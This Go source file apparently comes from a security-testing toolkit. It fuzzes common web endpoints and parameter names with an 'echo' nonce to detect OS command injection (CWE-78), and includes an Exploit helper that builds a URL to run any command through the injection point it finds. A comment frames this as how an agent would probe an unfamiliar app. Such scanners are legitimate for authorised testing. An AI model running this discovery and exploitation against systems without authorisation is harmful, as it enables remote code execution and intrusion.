package gobrig

import (
	"context"
	"fmt"
	"net/url"
	"strings"
)

// RCEFinding is a discovered command-injection RCE on a web target.
type RCEFinding struct {
	Endpoint  string // path where the injection was found, e.g. /exec
	Param     string // the injected query parameter, e.g. cmd
	Payload   string // the injected value, e.g. echo n1a2b3
	Marker    string // the nonce the target echoed back
	Confirmed bool   // the nonce came back = the parameter is shell-injected
	CWE       string // CWE-78 (OS command injection)
	Evidence  string
}

// Exploit builds the request value that runs cmd through the discovered injection point.
func (f RCEFinding) Exploit(base, cmd string) string {
	return base + f.Endpoint + "?" + f.Param + "=" + url.QueryEscape(cmd)
}

// DefaultRCEEndpoints and DefaultRCEParams are the candidate shapes the hunter sweeps. The
// point is that it is NOT told the vulnerable one: it tries common endpoints and parameter
// names and confirms by code execution, the way an agent would probe an unfamiliar app.
var DefaultRCEEndpoints = []string{"/exec", "/run", "/cmd", "/ping", "/api/run", "/debug", "/"}
var DefaultRCEParams = []string{"cmd", "c", "command", "exec", "run", "q", "host", "ip", "target"}

// DiscoverRCE fuzzes endpoint x param with an "echo <nonce>" payload and confirms a command
// injection when the nonce comes back in the response — i.e. the parameter was run in a
// shell. fetch performs one HTTP GET of a full URL (over the Brig, HTTPGet wraps the Client;
// a test passes its own). It returns the first confirmed injection point.
func DiscoverRCE(ctx context.Context, fetch func(context.Context, string) (string, error), base string, endpoints, params []string) (RCEFinding, bool) {
	if endpoints == nil {
		endpoints = DefaultRCEEndpoints
	}
	if params == nil {
		params = DefaultRCEParams
	}
	marker := nonce()
	payload := "echo " + marker
	for _, ep := range endpoints {
		for _, p := range params {
			u := base + ep + "?" + p + "=" + url.QueryEscape(payload)
			body, err := fetch(ctx, u)
			if err == nil && strings.Contains(body, marker) {
				return RCEFinding{
					Endpoint: ep, Param: p, Payload: payload, Marker: marker, Confirmed: true, CWE: "CWE-78",
					Evidence: fmt.Sprintf("param %q on %s echoed the injected nonce %s — OS command injection", p, ep, marker),
				}, true
			}
		}
	}
	return RCEFinding{}, false
}
